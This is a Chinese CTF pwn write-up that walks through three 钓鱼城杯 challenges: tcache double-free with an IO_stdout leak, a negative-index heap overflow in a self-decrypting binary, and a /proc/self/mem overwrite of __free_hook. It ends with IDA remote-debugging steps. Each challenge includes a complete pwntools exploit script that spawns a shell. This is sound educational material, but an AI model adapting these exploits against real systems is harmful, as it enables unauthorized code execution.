# 钓鱼城杯Pwn Writeup学习

阅读量 **166775**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-10-21 11:00:37

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t0196decec4009a3e90.jpg)

作者：Alter@星盟

## 前言

星盟萌新，最近和师傅们一起打了钓鱼城杯比赛，虽然我实力有限全程只能划水，但师傅们太强了直接被带飞，所以赛后借着师傅们的WP复现学习了一下，把自己遇到的问题尽可能详细的写了一下，希望可以帮到和我一样的PWN新手

## 钓鱼城杯Veryeasy

UAF+tcache attack

###  1、将tcache放满的另一种方法

将一个chunk double free到tcache中之后，连续申请这个chunk
3次，tcache这条链就会被记为-1，然后再次删除这个size的chunk就会被放入unsorted bin中，如下图：

![](https://p0.ssl.qhimg.com/t017337bd642f7c9c00.png)

申请一次之后

![](https://p5.ssl.qhimg.com/t01f687835504c5628a.png)

以此类推，申请3次之后

![](https://p2.ssl.qhimg.com/t01c02c455e9d36c619.png)

此时变成-1之后应该是整数溢出，-1相当于最大的正数0xff大于7，所以下一个chunk会被放入unsorted bin中

本地关闭ASLR之后，Main arena和IO stdout居然不在一个内存页，挺神奇的。不过开启之后还是在同一个内存页的

![](https://p0.ssl.qhimg.com/t01adc4f765d8510d87.png)

###  2、常规分析

![](https://p3.ssl.qhimg.com/t013d3f5cdeb752a7e2.png)

全保护

###  3、IDA分析

有增删改功能，但是没有show函数，所以需要修改IO stdout

  * delete函数

![](https://p1.ssl.qhimg.com/t01b938e1052f3011d1.png)

漏洞点，显然有UAF漏洞，但是这里有一个if判断，dword_202010最开始为9，每add一次或者edit一次就会-1，dword_20204c每删除一次就会+1

###  4、利用思路

由于开启了全保护且没有show函数，所以需要通过IO
stdout泄露libc地址，但是限制了tcache的删除次数，所以通过向tcache里放7个chunk的方法行不通（其实好像也行，通过add和edit使dword_202010整数溢出就行，不过有点麻烦），所以这里采用上面说的方法，先double
free再申请3个chunk将tcache的计数器变成-1导致整数溢出，然后再次free就会放到unsorted bin中，通过edit部分写main
arena修改为IO stdout的地址，然后申请两个chunk到IO stdout
修改flags为0xfbad1887并改小writebase为0x58，泄露出libc。然后通过2次edit函数将dword_202010减为为-1整数溢出，再通过double
free chunk1申请到free hook的地址，修改为system即可，getshell

###  5、EXP：（来自haivk师傅的exp，稍有改动）

    
    
    from pwn import *
    #context.log_level='debug'
    #p=process('./veryeasy')
    libc=ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    
    def add(idx,size,content):
      p.recvuntil("Your choice :")
      p.sendline('1')
      p.recvuntil("id:\n")
      p.sendline(str(idx))
      p.recvuntil("please input your size:\n")
      p.sendline(str(size))
      p.recvuntil("content:\n")
      p.send(content)
    
    def edit(idx,content):
      p.recvuntil("Your choice :")
      p.sendline('2')
      p.recvuntil("id:\n")
      p.sendline(str(idx))
      p.recvuntil("content:\n")
      p.send(content)
    
    def delete(idx):
      p.recvuntil("Your choice :")
      p.sendline('3')
      p.recvuntil("id:\n")
      p.sendline(str(idx))
    
    def pwn():
      add(0,0xf0,'a')
      add(1,0x10,'a')
      delete(0)
      delete(0)
      add(2,0xf0,'\x60')
      add(3,0xf0,'\x60')
      add(4,0xf0,'\x60')
      delete(0)
      #edit(0,'\x60\x07\xdd')
      edit(0,'\x60\x97')
      add(5,0xf0,'a')
      #gdb.attach(p)
      add(6,0xf0,p64(0xfbad1887)+p64(0)*3+'\x58')
      #p.recvuntil('\n')
      libcbase=u64(p.recv(6).ljust(8,'\x00'))-0x3e82a0
      print hex(libcbase)
      free_hook=libcbase+libc.sym['__free_hook']
      system=libcbase+libc.sym['system']
      edit(0,'a')
      edit(0,'a')
      #gdb.attach(p)
      delete(1)
      edit(1,p64(free_hook))
      add(7,0x10,'/bin/sh\x00')
      add(8,0x10,p64(system))
      delete(7)
      p.interactive()
    
    #pwn()
    while True:
      try:
        p=process("./veryeasy")
        pwn()
        p.interactive()
      except:
        p.close()
        print ("retrying...")
    

## 钓鱼城杯unknown

程序自修改解密（比较逆向）+堆溢出+tcache attack

###  1、常规分析

![](https://p5.ssl.qhimg.com/t0171d173f5c14880d5.png)

保护全开

###  2、IDA分析

用IDA打开后发现，里面没有什么正常的函数，无法反汇编，发现是中间有一些加密之后的指令混在函数中，导致反汇编失败。在haivk师傅的帮助下，通过IDA的动态调试，运行程序，利用程序的自修改解密，得到正常的elf文件（具体过程参照文末IDA动态调试）

  * Menu函数

![](https://p5.ssl.qhimg.com/t0143ee8b3cffb33fc8.png)

写得奇奇怪怪，其实就是增删改查功能

  * add函数

![](https://p0.ssl.qhimg.com/t0144816c91fd0de666.png)

仔细看会发现对于idx只做了上限，没有考虑下限，所以我们可以输入负数，v3是一个int类型的数，是有正负的，所以没有整数溢出，但是仔细想想会发现向ptr[-1]这个位置写就有点意思了，这个位置在ptr地址的上面

  * delete函数

![](https://p2.ssl.qhimg.com/t0129eabe07cea3a829.png)

没有UAF，非常正常

  * show函数

![](https://p2.ssl.qhimg.com/t01122a3d2b3ef04c19.png)

给了show函数，挺开心的，不同再修改IO_stdout泄露libc了

  * edit函数

![](https://p5.ssl.qhimg.com/t0107f355d01f37a430.png)

发现向堆中读入Size数组记录的那么多个字节

###  3、利用思路

粗看好像没有什么漏洞，但是仔细想想结合add和edit函数，会发现一个问题，add函数可以申请index为-1的chunk，查看一下ptr和Size数组的地址

![](https://p2.ssl.qhimg.com/t017341b0d03428b2d2.png)

发现正好相差了0x80，而0x80/8=16，正好是16个p64长度的东西，而这些地址全是用来记录chunk的size的，所以我们申请index为负数的chunk就意味着可以修改Size数组中的size的值，而edit读入的size又是根据这个数组中的size确定的，所以我们就有了一个堆溢出漏洞。

首先将一个chunk放到unsorted
bin中，用show函数泄露出libc地址，再申请index为-1的chunk，实现栈溢出，将一个free掉了的tcache
chunk的fd指针修改为free hook，在通过tcache poisioning申请得到free
hook，修改为system函数地址即可getshell

申请index=-1的chunk前后Size的变化

申请前

![](https://p3.ssl.qhimg.com/t01ff4d6eb370db37de.png)

申请后

![](https://p2.ssl.qhimg.com/t0121b1c44437b05d92.png)

可以看到原本Size[15]=0，申请index=-1的chunk之后，Size[15]被修改成了堆地址，而这个值很大，所以我们可以向chunk
15中写入这么多字节的数据，实现了堆溢出，之后修改fd指针就行了

###  EXP：（改编自haivk师傅的exp）

    
    
    from pwn import *
    context.log_level='debug'
    p=process("./unknown")
    libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
    
    def add(idx,size):
      p.recvuntil("Your choice: ")
      p.sendline('1')
      p.recvuntil("Index: ")
      p.sendline(str(idx))
      p.recvuntil("Size: ")
      p.sendline(str(size))
    
    def edit(idx,content):
      p.recvuntil("Your choice: ")
      p.sendline('2')
      p.recvuntil("Index: ")
      p.sendline(str(idx))
      #p.recvuntil("\n")
      sleep(0.2)
      p.send(content)
    
    def show(idx):
      p.recvuntil("Your choice: ")
      p.sendline('3')
      p.recvuntil("Index: ")
      p.sendline(str(idx))
    
    def delete(idx):
      p.recvuntil("Your choice: ")
      p.sendline('4')
      p.recvuntil("Index: ")
      p.sendline(str(idx))
    
    add(0,0x100)
    for i in range(1,8):
      add(i,0x100)
    for i in range(1,8):
      delete(i)
    delete(0)
    add(15,0)
    add(1,0x20)
    #add(9,0x30)
    show(15)
    main_arena=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
    libcbase=main_arena-0x3ebda0
    print hex(libcbase)
    free_hook=libcbase+libc.sym['__free_hook']
    system=libcbase+libc.sym['system']
    gdb.attach(p)
    add('-1',0x20)
    delete(1)
    edit(15,'a'*0x10+p64(0)+p64(0x31)+p64(free_hook)+'\n')
    add(2,0x20)
    add(3,0x20)
    edit(2,'/bin/sh\x00\n')
    edit(3,p64(system)+'\n')
    delete(2)
    p.interactive()
    

## 钓鱼城杯Fsplayground

/proc/self/maps和/proc/self/mem的理解和利用

###  1、前置知识

####  （1）/proc目录

Linux系统内核提供了一种通过/proc文件系统，在程序运行时访问内核数据，改变内核设置的机制。/proc是一种伪文件结构，也就是说是仅存在于内存中，不存在于外存中的。/proc中一般比较重要的目录是sys，net和scsi，sys目录是可写的，可以通过它来访问和修改内核的参数。

/proc中还有一些以PID命名（进程号）的进程目录，可以读取对应进程的信息。另外还有一个/self目录，用于记录本进程的信息

####  （2）/proc/self目录

![](https://p5.ssl.qhimg.com/t013362d2452f503b04.png)

由上面的可知，我们可以通过/proc/$PID/目录来获得该进程的信息，但是这个方法需要知道进程的PID是多少，在fork、daemon等情况下，PID可能还会发生变化。所以Linux提供了self目录，来解决这个问题，这个目录比较独特，不同的进程来访问获得的信息是不同的，内容等价于/proc/本进程PID/目录下的内容。所以可以通过self目录直接获得自身的信息，不需要知道PID

####  （3）/proc/self/maps

![](https://p2.ssl.qhimg.com/t0100ee2add6c45cbdd.png)

这个文件用于记录当前进程的内存映射关系，类似于gdb下的vmmap指令，通过读取该文件可以获得内存代码段基地址

####  （4）/proc/self/mem

该文件记录的是进程的内存信息，通过修改该文件相当于直接修改进程的内存。这个文件是可读可写的，但是如果直接读的话就会出现下面的报错

![](https://p0.ssl.qhimg.com/t016f64d311143759e7.png)

需要结合maps的映射信息来确定读的偏移值，无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取出内容。

也可以通过写入mem文件来直接写入内存，例如直接修改代码段写入shellcode等

###  2、常规分析

![](https://p3.ssl.qhimg.com/t0186f08b4b39f957d2.png)

保护全开

###  3、IDA分析

  * menu函数

发现是一个文件读写系统

  * open函数

读取的文件名不可以包含flag字符串，所以无法直接读取flag，但是会发现只有这一个限制，所以我们可以打开除包含flag字节在内的任意文件，然后还要两个选项可以选择文件打开的状态，只读或者读写。然后只能同时打开一个文件

  * close函数

把打开的文件关闭

  * seek函数

可以切换文件中指针的位置，实现该文件任意位置的读写

  * read函数

将文件中的内容读出，并打印到终端

  * write函数

将终端输入写入到文件中

###  4、利用思路

因为无法打开flag随意不能直接读取flag，要想办法getshell。根据Linux的知识可知，/proc/self/maps中有内存映射关系，可以泄露libc地址，然后通过修改/proc/self/mem可以直接修改程序内存。所以思路就是打开/proc/self/maps文件读取libc地址，然后通过/proc/self/mem将free
hook修改为system的地址。因为上边的write中使用了free函数并将我们输入的内容作为参数释放，所以我们可以直接在我们输入的内容中就布置/bin/sh参数

###  EXP：（来自NU1l战队的wp，稍作修改）

    
    
    from pwn import *
    context.log_level='debug'
    p=process("./fsplayground")
    libc=ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    
    def openfile(name,option):
      p.recvuntil("Your choice: ")
      p.sendline('1')
      p.recvuntil("Filename: ")
      p.sendline(str(name))
      p.recvuntil("Option: ")
      p.sendline(str(option))
    
    def closefile():
      p.recvuntil("Your choice: ")
      p.sendline('2')
    
    def seekfile(offset):
      p.recvuntil("Your choice: ")
      p.sendline('3')
      p.recvuntil("Offset: ")
      p.sendline(str(offset))
    
    def readfile(size):
      p.recvuntil("Your choice: ")
      p.sendline('4')
      p.recvuntil("Size: ")
      p.sendline(str(size))
    
    def writefile(size,content):
      p.recvuntil("Your choice: ")
      p.sendline('5')
      p.recvuntil("Size: ")
      p.sendline(str(size))
      p.recvuntil("Content: ")
      p.send(content)
    
    openfile("/proc/self/maps\x00",0)
    readfile(0x1000)
    r=p.recvuntil("6. exit").splitlines()#这里将maps中的内容全部读入，然后用splitlines分成一行行，再通过循环寻找libc-2.27也就是libc的基地址那行，找到之后打印出来
    find=''
    for i in r:
      if 'libc-2.27.so' in i and 'r-xp' in i:
        find=i
        break
    print (find)
    libcbase=int(find[:12],16)
    print hex(libcbase)
    closefile()
    
    openfile("/proc/self/mem\x00",1)
    seekfile(libcbase+libc.sym["__free_hook"]-8)
    writefile(0x10,'/bin/sh\x00'+p64(libcbase+libc.sym['system']))
    p.interactive()
    

参考链接:

<https://www.jianshu.com/p/3fba2e5b1e17>

<https://blog.csdn.net/dillanzhou/article/details/82876575>

## IDA动态调试

IDA Pro非常强大，可以动态调试，之前一直都不太会使用，一直都是用的gdb，虽然现在会了之后还是觉得gdb比较好用2333

在钓鱼城杯的一道题中从haivk师傅那里得知了IDA动态调试的方法，可以用来解决一些程序无法直接反汇编的问题。可以尝试使用IDA动态调试，利用程序自修改解密，拿到正常的代码

###  1、IDA动态调试步骤（以Windows下为例）

用IDA调试ELF文件，是无法完全独立依靠Windows完成的，需要一个Linux虚拟机

（1）

首先将在Windows中的IDA文件夹里找出linux_server（64）这两个运行程序，然后将其复制到Linux中

（2）

在Linux中sudo 运行Linux_server，如果64位程序就选64位的server。

（3）

打开IDA将需要分析的bin文件拖入到IDA中，并在debugger—>selete debugger中选择remote Linux debugger

上一步完成之后，debugger就会变成下图这样，选择process options

接下来这一步很关键，很大程度上决定了能不能调试成功

在application和input
file中都要填入Linux中elf文件的路径（包括程序），在dir中填入elf文件所在的文件夹路径，hostname这里需要写入Linux的ip地址，由于我做了端口映射，所以我直接填入localhost。确定即可

（4）

接下去选择start process或者选择attach to
process，如果我们选择了attach这一步，那就需要在Linux中先运行要调试的程序，然后attach到这个程序的进程上即可。（两个效果不一定一样，一个远程一个本地）

（5）

接下去基本上就是正常的调试了，虽然我不太会

![](https://p1.ssl.qhimg.com/t010fef1a221ef40a11.png)

需要注意的是，如果该程序是自修改解密的，那么解密之后的那部分数据依然是以数据的形式存在在文件中的，所以我们需要使用c（code）指令将这段数据强制转换成代码，之后create
function就可以正常F5了

## 总结：

感谢haivk师傅的讲解，感觉自己在逆向方面了解的比较少，对Linux系统内部一些实现不够了解，希望可以跟着星盟的师傅们学习，也欢迎其他师傅们加入星盟

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **星盟安全团队** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/218886](/post/id/218886)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)

 **+1** __5赞

 __收藏

![](https://p3.ssl.qhimg.com/t0194c173898acf47c6.png) 星盟安全团队

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

